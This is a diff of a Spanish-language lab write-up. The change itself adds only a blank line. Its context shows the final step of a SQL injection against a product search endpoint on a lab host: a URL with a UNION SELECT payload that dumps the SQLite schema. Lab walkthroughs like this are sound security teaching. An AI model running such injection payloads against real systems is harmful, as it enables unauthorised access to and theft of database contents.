@@ -195,6 +195,7 @@ Como resultado obtenemos lo siguiente.
 ![columnas](../img/lab-25-D/202211232037.png)
 
 Por último solo hay que reemplazar uno de los valores fijos ('1', '2', ...) con el nombre de la columna correcta, que es ***sql***. En la barra de direcciones escribimos.
+
 Nota: hemos sustituido ***'1'*** por ***sql***
 ```
 https://192.168.20.60:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
